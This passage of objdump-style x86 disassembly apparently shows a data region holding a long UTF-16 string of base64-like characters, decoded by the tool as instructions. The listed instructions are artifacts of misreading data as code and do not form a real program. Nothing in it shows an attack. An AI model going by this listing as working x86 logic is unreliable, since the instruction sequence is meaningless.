  40ab43:	00 55 00             	add    %dl,0x0(%ebp)
  40ab46:	54                   	push   %esp
  40ab47:	00 39                	add    %bh,(%ecx)
  40ab49:	00 35 00 4d 00 46    	add    %dh,0x46004d00
  40ab4f:	00 31                	add    %dh,(%ecx)
  40ab51:	00 59 00             	add    %bl,0x0(%ecx)
  40ab54:	43                   	inc    %ebx
  40ab55:	00 6c 00 36          	add    %ch,0x36(%eax,%eax,1)
  40ab59:	00 72 00             	add    %dh,0x0(%edx)
  40ab5c:	4c                   	dec    %esp
  40ab5d:	00 59 00             	add    %bl,0x0(%ecx)
  40ab60:	34 00                	xor    $0x0,%al
  40ab62:	74 00                	je     0x40ab64
  40ab64:	79 00                	jns    0x40ab66
  40ab66:	7a 00                	jp     0x40ab68
  40ab68:	54                   	push   %esp
  40ab69:	00 6f 00             	add    %ch,0x0(%edi)
  40ab6c:	4c                   	dec    %esp
  40ab6d:	00 6a 00             	add    %ch,0x0(%edx)
  40ab70:	49                   	dec    %ecx
  40ab71:	00 67 00             	add    %ah,0x0(%edi)
  40ab74:	4a                   	dec    %edx
  40ab75:	00 66 00             	add    %ah,0x0(%esi)
  40ab78:	31 00                	xor    %eax,(%eax)
  40ab7a:	43                   	inc    %ebx
  40ab7b:	00 41 00             	add    %al,0x0(%ecx)
  40ab7e:	6c                   	insb   (%dx),%es:(%edi)
  40ab7f:	00 73 00             	add    %dh,0x0(%ebx)
  40ab82:	6c                   	insb   (%dx),%es:(%edi)
  40ab83:	00 43 00             	add    %al,0x0(%ebx)
  40ab86:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40ab8a:	73 00                	jae    0x40ab8c
  40ab8c:	65 00 36             	add    %dh,%gs:(%esi)
  40ab8f:	00 38                	add    %bh,(%eax)
  40ab91:	00 50 00             	add    %dl,0x0(%eax)
  40ab94:	2f                   	das
  40ab95:	00 2f                	add    %ch,(%edi)
  40ab97:	00 4e 00             	add    %cl,0x0(%esi)
  40ab9a:	66 00 33             	data16 add %dh,(%ebx)
  40ab9d:	00 49 00             	add    %cl,0x0(%ecx)
  40aba0:	4a                   	dec    %edx
  40aba1:	00 30                	add    %dh,(%eax)
  40aba3:	00 78 00             	add    %bh,0x0(%eax)
  40aba6:	73 00                	jae    0x40aba8
  40aba8:	33 00                	xor    (%eax),%eax
  40abaa:	78 00                	js     0x40abac
  40abac:	45                   	inc    %ebp
  40abad:	00 54 00 75          	add    %dl,0x75(%eax,%eax,1)
  40abb1:	00 51 00             	add    %dl,0x0(%ecx)
  40abb4:	5a                   	pop    %edx
  40abb5:	00 39                	add    %bh,(%ecx)
  40abb7:	00 49 00             	add    %cl,0x0(%ecx)
  40abba:	44                   	inc    %esp
  40abbb:	00 58 00             	add    %bl,0x0(%eax)
  40abbe:	77 00                	ja     0x40abc0
  40abc0:	58                   	pop    %eax
  40abc1:	00 4b 00             	add    %cl,0x0(%ebx)
  40abc4:	49                   	dec    %ecx
  40abc5:	00 58 00             	add    %bl,0x0(%eax)
  40abc8:	73 00                	jae    0x40abca
  40abca:	54                   	push   %esp
  40abcb:	00 38                	add    %bh,(%eax)
  40abcd:	00 66 00             	add    %ah,0x0(%esi)
  40abd0:	78 00                	js     0x40abd2
  40abd2:	61                   	popa
  40abd3:	00 53 00             	add    %dl,0x0(%ebx)
  40abd6:	79 00                	jns    0x40abd8
  40abd8:	44                   	inc    %esp
  40abd9:	00 2b                	add    %ch,(%ebx)
  40abdb:	00 6f 00             	add    %ch,0x0(%edi)
  40abde:	2f                   	das
  40abdf:	00 79 00             	add    %bh,0x0(%ecx)
  40abe2:	78 00                	js     0x40abe4
  40abe4:	48                   	dec    %eax
  40abe5:	00 7a 00             	add    %bh,0x0(%edx)
  40abe8:	67 00 4b 00          	add    %cl,0x0(%bp,%di)
  40abec:	5a                   	pop    %edx
  40abed:	00 63 00             	add    %ah,0x0(%ebx)
  40abf0:	2f                   	das
  40abf1:	00 38                	add    %bh,(%eax)
  40abf3:	00 51 00             	add    %dl,0x0(%ecx)
  40abf6:	69 00 43 00 74 00    	imul   $0x740043,(%eax),%eax
  40abfc:	71 00                	jno    0x40abfe
  40abfe:	65 00 75 00          	add    %dh,%gs:0x0(%ebp)
  40ac02:	4b                   	dec    %ebx
  40ac03:	00 49 00             	add    %cl,0x0(%ecx)
  40ac06:	34 00                	xor    $0x0,%al
  40ac08:	6b 00 38             	imul   $0x38,(%eax),%eax
  40ac0b:	00 33                	add    %dh,(%ebx)
  40ac0d:	00 54 00 71          	add    %dl,0x71(%eax,%eax,1)
  40ac11:	00 52 00             	add    %dl,0x0(%edx)
  40ac14:	50                   	push   %eax
  40ac15:	00 72 00             	add    %dh,0x0(%edx)
  40ac18:	75 00                	jne    0x40ac1a
  40ac1a:	75 00                	jne    0x40ac1c
  40ac1c:	6d                   	insl   (%dx),%es:(%edi)
  40ac1d:	00 32                	add    %dh,(%edx)
  40ac1f:	00 30                	add    %dh,(%eax)
  40ac21:	00 4e 00             	add    %cl,0x0(%esi)
  40ac24:	48                   	dec    %eax
  40ac25:	00 55 00             	add    %dl,0x0(%ebp)
  40ac28:	46                   	inc    %esi
  40ac29:	00 72 00             	add    %dh,0x0(%edx)
  40ac2c:	6c                   	insb   (%dx),%es:(%edi)
  40ac2d:	00 57 00             	add    %dl,0x0(%edi)
  40ac30:	35 00 58 00 59       	xor    $0x59005800,%eax
  40ac35:	00 69 00             	add    %ch,0x0(%ecx)
  40ac38:	79 00                	jns    0x40ac3a
  40ac3a:	63 00                	arpl   %eax,(%eax)
  40ac3c:	50                   	push   %eax
  40ac3d:	00 4c 00 57          	add    %cl,0x57(%eax,%eax,1)
  40ac41:	00 6c 00 4c          	add    %ch,0x4c(%eax,%eax,1)
  40ac45:	00 43 00             	add    %al,0x0(%ebx)
  40ac48:	56                   	push   %esi
  40ac49:	00 39                	add    %bh,(%ecx)
  40ac4b:	00 48 00             	add    %cl,0x0(%eax)
  40ac4e:	4f                   	dec    %edi
  40ac4f:	00 32                	add    %dh,(%edx)
  40ac51:	00 39                	add    %bh,(%ecx)
  40ac53:	00 62 00             	add    %ah,0x0(%edx)
  40ac56:	37                   	aaa
  40ac57:	00 2f                	add    %ch,(%edi)
  40ac59:	00 2b                	add    %ch,(%ebx)
  40ac5b:	00 6c 00 62          	add    %ch,0x62(%eax,%eax,1)
  40ac5f:	00 6b 00             	add    %ch,0x0(%ebx)
  40ac62:	4e                   	dec    %esi
  40ac63:	00 77 00             	add    %dh,0x0(%edi)
  40ac66:	55                   	push   %ebp
  40ac67:	00 47 00             	add    %al,0x0(%edi)
  40ac6a:	48                   	dec    %eax
  40ac6b:	00 64 00 4b          	add    %ah,0x4b(%eax,%eax,1)
  40ac6f:	00 48 00             	add    %cl,0x0(%eax)
  40ac72:	47                   	inc    %edi
  40ac73:	00 74 00 78          	add    %dh,0x78(%eax,%eax,1)
  40ac77:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ac7a:	54                   	push   %esp
  40ac7b:	00 43 00             	add    %al,0x0(%ebx)
  40ac7e:	5a                   	pop    %edx
  40ac7f:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ac82:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
  40ac86:	72 00                	jb     0x40ac88
  40ac88:	6a 00                	push   $0x0
  40ac8a:	44                   	inc    %esp
  40ac8b:	00 4b 00             	add    %cl,0x0(%ebx)
  40ac8e:	6b 00 37             	imul   $0x37,(%eax),%eax
  40ac91:	00 48 00             	add    %cl,0x0(%eax)
  40ac94:	44                   	inc    %esp
  40ac95:	00 79 00             	add    %bh,0x0(%ecx)
  40ac98:	2b 00                	sub    (%eax),%eax
  40ac9a:	61                   	popa
  40ac9b:	00 35 00 76 00 49    	add    %dh,0x49007600
  40aca1:	00 63 00             	add    %ah,0x0(%ebx)
  40aca4:	71 00                	jno    0x40aca6
  40aca6:	7a 00                	jp     0x40aca8
  40aca8:	6f                   	outsl  %ds:(%esi),(%dx)
  40aca9:	00 57 00             	add    %dl,0x0(%edi)
  40acac:	78 00                	js     0x40acae
  40acae:	76 00                	jbe    0x40acb0
  40acb0:	72 00                	jb     0x40acb2
  40acb2:	48                   	dec    %eax
  40acb3:	00 75 00             	add    %dh,0x0(%ebp)
  40acb6:	52                   	push   %edx
  40acb7:	00 67 00             	add    %ah,0x0(%edi)
  40acba:	41                   	inc    %ecx
  40acbb:	00 33                	add    %dh,(%ebx)
  40acbd:	00 52 00             	add    %dl,0x0(%edx)
  40acc0:	6c                   	insb   (%dx),%es:(%edi)
  40acc1:	00 62 00             	add    %ah,0x0(%edx)
  40acc4:	57                   	push   %edi
  40acc5:	00 66 00             	add    %ah,0x0(%esi)
  40acc8:	49                   	dec    %ecx
  40acc9:	00 4c 00 62          	add    %cl,0x62(%eax,%eax,1)
  40accd:	00 4e 00             	add    %cl,0x0(%esi)
  40acd0:	38 00                	cmp    %al,(%eax)
  40acd2:	5a                   	pop    %edx
  40acd3:	00 56 00             	add    %dl,0x0(%esi)
  40acd6:	77 00                	ja     0x40acd8
  40acd8:	6c                   	insb   (%dx),%es:(%edi)
  40acd9:	00 66 00             	add    %ah,0x0(%esi)
  40acdc:	67 00 56 00          	add    %dl,0x0(%bp)
  40ace0:	47                   	inc    %edi
  40ace1:	00 41 00             	add    %al,0x0(%ecx)
  40ace4:	4f                   	dec    %edi
  40ace5:	00 2f                	add    %ch,(%edi)
  40ace7:	00 39                	add    %bh,(%ecx)
  40ace9:	00 73 00             	add    %dh,0x0(%ebx)
  40acec:	63 00                	arpl   %eax,(%eax)
  40acee:	52                   	push   %edx
  40acef:	00 73 00             	add    %dh,0x0(%ebx)
  40acf2:	49                   	dec    %ecx
  40acf3:	00 78 00             	add    %bh,0x0(%eax)
  40acf6:	74 00                	je     0x40acf8
  40acf8:	56                   	push   %esi
  40acf9:	00 2b                	add    %ch,(%ebx)
  40acfb:	00 50 00             	add    %dl,0x0(%eax)
  40acfe:	47                   	inc    %edi
  40acff:	00 63 00             	add    %ah,0x0(%ebx)
  40ad02:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad03:	00 77 00             	add    %dh,0x0(%edi)
  40ad06:	33 00                	xor    (%eax),%eax
  40ad08:	6d                   	insl   (%dx),%es:(%edi)
  40ad09:	00 61 00             	add    %ah,0x0(%ecx)
  40ad0c:	64 00 46 00          	add    %al,%fs:0x0(%esi)
  40ad10:	68 00 46 00 47       	push   $0x47004600
  40ad15:	00 38                	add    %bh,(%eax)
  40ad17:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ad1a:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad1b:	00 6b 00             	add    %ch,0x0(%ebx)
  40ad1e:	76 00                	jbe    0x40ad20
  40ad20:	6c                   	insb   (%dx),%es:(%edi)
  40ad21:	00 77 00             	add    %dh,0x0(%edi)
  40ad24:	47                   	inc    %edi
  40ad25:	00 69 00             	add    %ch,0x0(%ecx)
  40ad28:	76 00                	jbe    0x40ad2a
  40ad2a:	36 00 76 00          	add    %dh,%ss:0x0(%esi)
  40ad2e:	4f                   	dec    %edi
  40ad2f:	00 71 00             	add    %dh,0x0(%ecx)
  40ad32:	35 00 4b 00 78       	xor    $0x78004b00,%eax
  40ad37:	00 76 00             	add    %dh,0x0(%esi)
  40ad3a:	59                   	pop    %ecx
  40ad3b:	00 69 00             	add    %ch,0x0(%ecx)
  40ad3e:	6b 00 66             	imul   $0x66,(%eax),%eax
  40ad41:	00 77 00             	add    %dh,0x0(%edi)
  40ad44:	55                   	push   %ebp
  40ad45:	00 77 00             	add    %dh,0x0(%edi)
  40ad48:	47                   	inc    %edi
  40ad49:	00 59 00             	add    %bl,0x0(%ecx)
  40ad4c:	56                   	push   %esi
  40ad4d:	00 6d 00             	add    %ch,0x0(%ebp)
  40ad50:	5a                   	pop    %edx
  40ad51:	00 37                	add    %dh,(%edi)
  40ad53:	00 72 00             	add    %dh,0x0(%edx)
  40ad56:	30 00                	xor    %al,(%eax)
  40ad58:	72 00                	jb     0x40ad5a
  40ad5a:	39 00                	cmp    %eax,(%eax)
  40ad5c:	61                   	popa
  40ad5d:	00 43 00             	add    %al,0x0(%ebx)
  40ad60:	6b 00 69             	imul   $0x69,(%eax),%eax
  40ad63:	00 4d 00             	add    %cl,0x0(%ebp)
  40ad66:	4a                   	dec    %edx
  40ad67:	00 5a 00             	add    %bl,0x0(%edx)
  40ad6a:	49                   	dec    %ecx
  40ad6b:	00 65 00             	add    %ah,0x0(%ebp)
  40ad6e:	33 00                	xor    (%eax),%eax
  40ad70:	4d                   	dec    %ebp
  40ad71:	00 49 00             	add    %cl,0x0(%ecx)
  40ad74:	7a 00                	jp     0x40ad76
  40ad76:	57                   	push   %edi
  40ad77:	00 44 00 4a          	add    %al,0x4a(%eax,%eax,1)
  40ad7b:	00 4f 00             	add    %cl,0x0(%edi)
  40ad7e:	61                   	popa
  40ad7f:	00 41 00             	add    %al,0x0(%ecx)
  40ad82:	4a                   	dec    %edx
  40ad83:	00 49 00             	add    %cl,0x0(%ecx)
  40ad86:	44                   	inc    %esp
  40ad87:	00 6a 00             	add    %ch,0x0(%edx)
  40ad8a:	4c                   	dec    %esp
  40ad8b:	00 79 00             	add    %bh,0x0(%ecx)
  40ad8e:	51                   	push   %ecx
  40ad8f:	00 56 00             	add    %dl,0x0(%esi)
  40ad92:	6c                   	insb   (%dx),%es:(%edi)
  40ad93:	00 51 00             	add    %dl,0x0(%ecx)
  40ad96:	4c                   	dec    %esp
  40ad97:	00 33                	add    %dh,(%ebx)
  40ad99:	00 78 00             	add    %bh,0x0(%eax)
  40ad9c:	68 00 6e 00 54       	push   $0x54006e00
  40ada1:	00 36                	add    %dh,(%esi)
  40ada3:	00 73 00             	add    %dh,0x0(%ebx)
  40ada6:	4a                   	dec    %edx
  40ada7:	00 58 00             	add    %bl,0x0(%eax)
  40adaa:	61                   	popa
  40adab:	00 62 00             	add    %ah,0x0(%edx)
  40adae:	42                   	inc    %edx
  40adaf:	00 79 00             	add    %bh,0x0(%ecx)
  40adb2:	4c                   	dec    %esp
  40adb3:	00 5a 00             	add    %bl,0x0(%edx)
  40adb6:	34 00                	xor    $0x0,%al
  40adb8:	57                   	push   %edi
  40adb9:	00 35 00 7a 00 74    	add    %dh,0x74007a00
  40adbf:	00 4d 00             	add    %cl,0x0(%ebp)
  40adc2:	49                   	dec    %ecx
  40adc3:	00 30                	add    %dh,(%eax)
  40adc5:	00 75 00             	add    %dh,0x0(%ebp)
  40adc8:	53                   	push   %ebx
  40adc9:	00 72 00             	add    %dh,0x0(%edx)
  40adcc:	59                   	pop    %ecx
  40adcd:	00 78 00             	add    %bh,0x0(%eax)
  40add0:	34 00                	xor    $0x0,%al
  40add2:	79 00                	jns    0x40add4
  40add4:	78 00                	js     0x40add6
  40add6:	47                   	inc    %edi
  40add7:	00 51 00             	add    %dl,0x0(%ecx)
  40adda:	51                   	push   %ecx
  40addb:	00 48 00             	add    %cl,0x0(%eax)
  40adde:	4d                   	dec    %ebp
  40addf:	00 48 00             	add    %cl,0x0(%eax)
  40ade2:	78 00                	js     0x40ade4
  40ade4:	69 00 63 00 6c 00    	imul   $0x6c0063,(%eax),%eax
  40adea:	4e                   	dec    %esi
  40adeb:	00 4d 00             	add    %cl,0x0(%ebp)
  40adee:	6f                   	outsl  %ds:(%esi),(%dx)
  40adef:	00 67 00             	add    %ah,0x0(%edi)
  40adf2:	57                   	push   %edi
  40adf3:	00 48 00             	add    %cl,0x0(%eax)
  40adf6:	36 00 70 00          	add    %dh,%ss:0x0(%eax)
  40adfa:	57                   	push   %edi
  40adfb:	00 45 00             	add    %al,0x0(%ebp)
  40adfe:	75 00                	jne    0x40ae00
  40ae00:	7a 00                	jp     0x40ae02
  40ae02:	57                   	push   %edi
  40ae03:	00 65 00             	add    %ah,0x0(%ebp)
  40ae06:	44                   	inc    %esp
  40ae07:	00 35 00 6e 00 44    	add    %dh,0x44006e00
  40ae0d:	00 4b 00             	add    %cl,0x0(%ebx)
  40ae10:	52                   	push   %edx
  40ae11:	00 61 00             	add    %ah,0x0(%ecx)
  40ae14:	52                   	push   %edx
  40ae15:	00 54 00 44          	add    %dl,0x44(%eax,%eax,1)
  40ae19:	00 7a 00             	add    %bh,0x0(%edx)
  40ae1c:	75 00                	jne    0x40ae1e
  40ae1e:	62 00                	bound  %eax,(%eax)
  40ae20:	69 00 33 00 69 00    	imul   $0x690033,(%eax),%eax
  40ae26:	68 00 69 00 37       	push   $0x37006900
  40ae2b:	00 58 00             	add    %bl,0x0(%eax)
  40ae2e:	61                   	popa
  40ae2f:	00 71 00             	add    %dh,0x0(%ecx)
  40ae32:	57                   	push   %edi
  40ae33:	00 54 00 45          	add    %dl,0x45(%eax,%eax,1)
  40ae37:	00 2b                	add    %ch,(%ebx)
  40ae39:	00 6d 00             	add    %ch,0x0(%ebp)
  40ae3c:	63 00                	arpl   %eax,(%eax)
  40ae3e:	47                   	inc    %edi
  40ae3f:	00 66 00             	add    %ah,0x0(%esi)
  40ae42:	63 00                	arpl   %eax,(%eax)
  40ae44:	70 00                	jo     0x40ae46
  40ae46:	73 00                	jae    0x40ae48
  40ae48:	4a                   	dec    %edx
  40ae49:	00 6f 00             	add    %ch,0x0(%edi)
  40ae4c:	71 00                	jno    0x40ae4e
  40ae4e:	66 00 5a 00          	data16 add %bl,0x0(%edx)
  40ae52:	59                   	pop    %ecx
  40ae53:	00 48 00             	add    %cl,0x0(%eax)
  40ae56:	43                   	inc    %ebx
  40ae57:	00 63 00             	add    %ah,0x0(%ebx)
  40ae5a:	62 00                	bound  %eax,(%eax)
  40ae5c:	55                   	push   %ebp
  40ae5d:	00 75 00             	add    %dh,0x0(%ebp)
  40ae60:	36 00 4a 00          	add    %cl,%ss:0x0(%edx)
  40ae64:	51                   	push   %ecx
  40ae65:	00 30                	add    %dh,(%eax)
  40ae67:	00 7a 00             	add    %bh,0x0(%edx)
  40ae6a:	48                   	dec    %eax
  40ae6b:	00 53 00             	add    %dl,0x0(%ebx)
  40ae6e:	6e                   	outsb  %ds:(%esi),(%dx)
  40ae6f:	00 47 00             	add    %al,0x0(%edi)
  40ae72:	61                   	popa
  40ae73:	00 6a 00             	add    %ch,0x0(%edx)
  40ae76:	64 00 4a 00          	add    %cl,%fs:0x0(%edx)
  40ae7a:	30 00                	xor    %al,(%eax)
  40ae7c:	50                   	push   %eax
  40ae7d:	00 55 00             	add    %dl,0x0(%ebp)
  40ae80:	2f                   	das
  40ae81:	00 63 00             	add    %ah,0x0(%ebx)
  40ae84:	44                   	inc    %esp
  40ae85:	00 54 00 2f          	add    %dl,0x2f(%eax,%eax,1)
  40ae89:	00 6c 00 51          	add    %ch,0x51(%eax,%eax,1)
  40ae8d:	00 7a 00             	add    %bh,0x0(%edx)
  40ae90:	50                   	push   %eax
  40ae91:	00 31                	add    %dh,(%ecx)
  40ae93:	00 39                	add    %bh,(%ecx)
  40ae95:	00 53 00             	add    %dl,0x0(%ebx)
  40ae98:	6d                   	insl   (%dx),%es:(%edi)
  40ae99:	00 44 00 63          	add    %al,0x63(%eax,%eax,1)
  40ae9d:	00 6d 00             	add    %ch,0x0(%ebp)
  40aea0:	71 00                	jno    0x40aea2
  40aea2:	75 00                	jne    0x40aea4
  40aea4:	46                   	inc    %esi
  40aea5:	00 41 00             	add    %al,0x0(%ecx)
  40aea8:	6e                   	outsb  %ds:(%esi),(%dx)
  40aea9:	00 55 00             	add    %dl,0x0(%ebp)
  40aeac:	31 00                	xor    %eax,(%eax)
  40aeae:	4f                   	dec    %edi
  40aeaf:	00 6b 00             	add    %ch,0x0(%ebx)
  40aeb2:	39 00                	cmp    %eax,(%eax)
  40aeb4:	67 00 47 00          	add    %al,0x0(%bx)
  40aeb8:	62 00                	bound  %eax,(%eax)
  40aeba:	65 00 57 00          	add    %dl,%gs:0x0(%edi)
  40aebe:	6f                   	outsl  %ds:(%esi),(%dx)
  40aebf:	00 30                	add    %dh,(%eax)
  40aec1:	00 4b 00             	add    %cl,0x0(%ebx)
  40aec4:	41                   	inc    %ecx
  40aec5:	00 32                	add    %dh,(%edx)
  40aec7:	00 35 00 57 00 66    	add    %dh,0x66005700
  40aecd:	00 37                	add    %dh,(%edi)
  40aecf:	00 69 00             	add    %ch,0x0(%ecx)
  40aed2:	67 00 32             	add    %dh,(%bp,%si)
  40aed5:	00 72 00             	add    %dh,0x0(%edx)
  40aed8:	68 00 5a 00 68       	push   $0x68005a00
  40aedd:	00 77 00             	add    %dh,0x0(%edi)
  40aee0:	47                   	inc    %edi
  40aee1:	00 66 00             	add    %ah,0x0(%esi)
  40aee4:	61                   	popa
  40aee5:	00 42 00             	add    %al,0x0(%edx)
  40aee8:	4e                   	dec    %esi
  40aee9:	00 4e 00             	add    %cl,0x0(%esi)
  40aeec:	00 87 b1 6b 00 66    	add    %al,0x66006bb1(%edi)
  40aef2:	00 69 00             	add    %ch,0x0(%ecx)
  40aef5:	44                   	inc    %esp
  40aef6:	00 30                	add    %dh,(%eax)
  40aef8:	00 64 00 30          	add    %ah,0x30(%eax,%eax,1)
  40aefc:	00 35 00 47 00 63    	add    %dh,0x63004700
  40af02:	00 44 00 74          	add    %al,0x74(%eax,%eax,1)
  40af06:	00 71 00             	add    %dh,0x0(%ecx)
  40af09:	74 00                	je     0x40af0b
  40af0b:	4d                   	dec    %ebp
  40af0c:	00 75 00             	add    %dh,0x0(%ebp)
  40af0f:	37                   	aaa
  40af10:	00 58 00             	add    %bl,0x0(%eax)
  40af13:	57                   	push   %edi
  40af14:	00 47 00             	add    %al,0x0(%edi)
  40af17:	5a                   	pop    %edx
  40af18:	00 6a 00             	add    %ch,0x0(%edx)
  40af1b:	6d                   	insl   (%dx),%es:(%edi)
  40af1c:	00 58 00             	add    %bl,0x0(%eax)
  40af1f:	34 00                	xor    $0x0,%al
  40af21:	50                   	push   %eax
  40af22:	00 54 00 44          	add    %dl,0x44(%eax,%eax,1)
  40af26:	00 46 00             	add    %al,0x0(%esi)
  40af29:	78 00                	js     0x40af2b
  40af2b:	55                   	push   %ebp
  40af2c:	00 45 00             	add    %al,0x0(%ebp)
  40af2f:	61                   	popa
  40af30:	00 57 00             	add    %dl,0x0(%edi)
  40af33:	79 00                	jns    0x40af35
  40af35:	46                   	inc    %esi
  40af36:	00 68 00             	add    %ch,0x0(%eax)
  40af39:	48                   	dec    %eax
  40af3a:	00 62 00             	add    %ah,0x0(%edx)
  40af3d:	46                   	inc    %esi
  40af3e:	00 42 00             	add    %al,0x0(%edx)
  40af41:	77 00                	ja     0x40af43
  40af43:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
  40af47:	75 00                	jne    0x40af49
  40af49:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40af4d:	31 00                	xor    %eax,(%eax)
  40af4f:	4a                   	dec    %edx
  40af50:	00 53 00             	add    %dl,0x0(%ebx)
  40af53:	37                   	aaa
  40af54:	00 70 00             	add    %dh,0x0(%eax)
  40af57:	31 00                	xor    %eax,(%eax)
  40af59:	43                   	inc    %ebx
  40af5a:	00 36                	add    %dh,(%esi)
  40af5c:	00 35 00 54 00 49    	add    %dh,0x49005400
  40af62:	00 34 00             	add    %dh,(%eax,%eax,1)
  40af65:	46                   	inc    %esi
  40af66:	00 5a 00             	add    %bl,0x0(%edx)
  40af69:	6d                   	insl   (%dx),%es:(%edi)
  40af6a:	00 33                	add    %dh,(%ebx)
  40af6c:	00 77 00             	add    %dh,0x0(%edi)
  40af6f:	74 00                	je     0x40af71
  40af71:	57                   	push   %edi
  40af72:	00 48 00             	add    %cl,0x0(%eax)
  40af75:	5a                   	pop    %edx
  40af76:	00 31                	add    %dh,(%ecx)
  40af78:	00 31                	add    %dh,(%ecx)
  40af7a:	00 6d 00             	add    %ch,0x0(%ebp)
  40af7d:	33 00                	xor    (%eax),%eax
  40af7f:	35 00 68 00 47       	xor    $0x47006800,%eax
  40af84:	00 73 00             	add    %dh,0x0(%ebx)
  40af87:	6a 00                	push   $0x0
  40af89:	6e                   	outsb  %ds:(%esi),(%dx)
  40af8a:	00 2f                	add    %ch,(%edi)
  40af8c:	00 64 00 2f          	add    %ah,0x2f(%eax,%eax,1)
  40af90:	00 55 00             	add    %dl,0x0(%ebp)
  40af93:	79 00                	jns    0x40af95
  40af95:	73 00                	jae    0x40af97
  40af97:	42                   	inc    %edx
  40af98:	00 74 00 48          	add    %dh,0x48(%eax,%eax,1)
  40af9c:	00 61 00             	add    %ah,0x0(%ecx)
  40af9f:	46                   	inc    %esi
  40afa0:	00 41 00             	add    %al,0x0(%ecx)
  40afa3:	78 00                	js     0x40afa5
  40afa5:	61                   	popa
  40afa6:	00 4f 00             	add    %cl,0x0(%edi)
  40afa9:	70 00                	jo     0x40afab
  40afab:	57                   	push   %edi
  40afac:	00 6c 00 37          	add    %ch,0x37(%eax,%eax,1)
  40afb0:	00 64 00 77          	add    %ah,0x77(%eax,%eax,1)
  40afb4:	00 4f 00             	add    %cl,0x0(%edi)
  40afb7:	4a                   	dec    %edx
  40afb8:	00 57 00             	add    %dl,0x0(%edi)
  40afbb:	50                   	push   %eax
  40afbc:	00 30                	add    %dh,(%eax)
  40afbe:	00 79 00             	add    %bh,0x0(%ecx)
  40afc1:	4b                   	dec    %ebx
  40afc2:	00 4c 00 4b          	add    %cl,0x4b(%eax,%eax,1)
  40afc6:	00 56 00             	add    %dl,0x0(%esi)
  40afc9:	33 00                	xor    (%eax),%eax
  40afcb:	78 00                	js     0x40afcd
  40afcd:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  40afd1:	45                   	inc    %ebp
  40afd2:	00 72 00             	add    %dh,0x0(%edx)
  40afd5:	59                   	pop    %ecx
  40afd6:	00 53 00             	add    %dl,0x0(%ebx)
  40afd9:	69 00 44 00 6c 00    	imul   $0x6c0044,(%eax),%eax
  40afdf:	48                   	dec    %eax
  40afe0:	00 6e 00             	add    %ch,0x0(%esi)
  40afe3:	78 00                	js     0x40afe5
  40afe5:	32 00                	xor    (%eax),%al
  40afe7:	4a                   	dec    %edx
  40afe8:	00 4f 00             	add    %cl,0x0(%edi)
  40afeb:	2f                   	das
  40afec:	00 30                	add    %dh,(%eax)
  40afee:	00 58 00             	add    %bl,0x0(%eax)
  40aff1:	76 00                	jbe    0x40aff3
  40aff3:	4f                   	dec    %edi
  40aff4:	00 45 00             	add    %al,0x0(%ebp)
  40aff7:	48                   	dec    %eax
  40aff8:	00 77 00             	add    %dh,0x0(%edi)
  40affb:	44                   	inc    %esp
  40affc:	00 6b 00             	add    %ch,0x0(%ebx)
  40afff:	46                   	inc    %esi
  40b000:	00 74 00 6c          	add    %dh,0x6c(%eax,%eax,1)
  40b004:	00 2b                	add    %ch,(%ebx)
  40b006:	00 68 00             	add    %ch,0x0(%eax)
  40b009:	38 00                	cmp    %al,(%eax)
  40b00b:	67 00 59 00          	add    %bl,0x0(%bx,%di)
  40b00f:	42                   	inc    %edx
  40b010:	00 55 00             	add    %dl,0x0(%ebp)
  40b013:	55                   	push   %ebp
  40b014:	00 67 00             	add    %ah,0x0(%edi)
  40b017:	41                   	inc    %ecx
  40b018:	00 59 00             	add    %bl,0x0(%ecx)
  40b01b:	58                   	pop    %eax
  40b01c:	00 2b                	add    %ch,(%ebx)
  40b01e:	00 46 00             	add    %al,0x0(%esi)
  40b021:	69 00 46 00 51 00    	imul   $0x510046,(%eax),%eax
  40b027:	4f                   	dec    %edi
  40b028:	00 4b 00             	add    %cl,0x0(%ebx)
  40b02b:	69 00 55 00 57 00    	imul   $0x570055,(%eax),%eax
  40b031:	72 00                	jb     0x40b033
  40b033:	64 00 75 00          	add    %dh,%fs:0x0(%ebp)
  40b037:	4f                   	dec    %edi
  40b038:	00 68 00             	add    %ch,0x0(%eax)
  40b03b:	52                   	push   %edx
  40b03c:	00 72 00             	add    %dh,0x0(%edx)
  40b03f:	46                   	inc    %esi
  40b040:	00 51 00             	add    %dl,0x0(%ecx)
  40b043:	2f                   	das
  40b044:	00 67 00             	add    %ah,0x0(%edi)
  40b047:	47                   	inc    %edi
  40b048:	00 37                	add    %dh,(%edi)
  40b04a:	00 68 00             	add    %ch,0x0(%eax)
  40b04d:	71 00                	jno    0x40b04f
  40b04f:	55                   	push   %ebp
  40b050:	00 61 00             	add    %ah,0x0(%ecx)
  40b053:	6b 00 57             	imul   $0x57,(%eax),%eax
  40b056:	00 78 00             	add    %bh,0x0(%eax)
  40b059:	4b                   	dec    %ebx
  40b05a:	00 52 00             	add    %dl,0x0(%edx)
  40b05d:	6a 00                	push   $0x0
  40b05f:	50                   	push   %eax
  40b060:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40b064:	00 38                	add    %bh,(%eax)
  40b066:	00 56 00             	add    %dl,0x0(%esi)
  40b069:	41                   	inc    %ecx
  40b06a:	00 51 00             	add    %dl,0x0(%ecx)
  40b06d:	64 00 6f 00          	add    %ch,%fs:0x0(%edi)
  40b071:	50                   	push   %eax
  40b072:	00 38                	add    %bh,(%eax)
  40b074:	00 77 00             	add    %dh,0x0(%edi)
  40b077:	6d                   	insl   (%dx),%es:(%edi)
  40b078:	00 2f                	add    %ch,(%edi)
  40b07a:	00 66 00             	add    %ah,0x0(%esi)
  40b07d:	48                   	dec    %eax
  40b07e:	00 31                	add    %dh,(%ecx)
  40b080:	00 33                	add    %dh,(%ebx)
  40b082:	00 57 00             	add    %dl,0x0(%edi)
  40b085:	42                   	inc    %edx
  40b086:	00 70 00             	add    %dh,0x0(%eax)
  40b089:	32 00                	xor    (%eax),%al
  40b08b:	37                   	aaa
  40b08c:	00 67 00             	add    %ah,0x0(%edi)
  40b08f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b090:	00 74 00 48          	add    %dh,0x48(%eax,%eax,1)
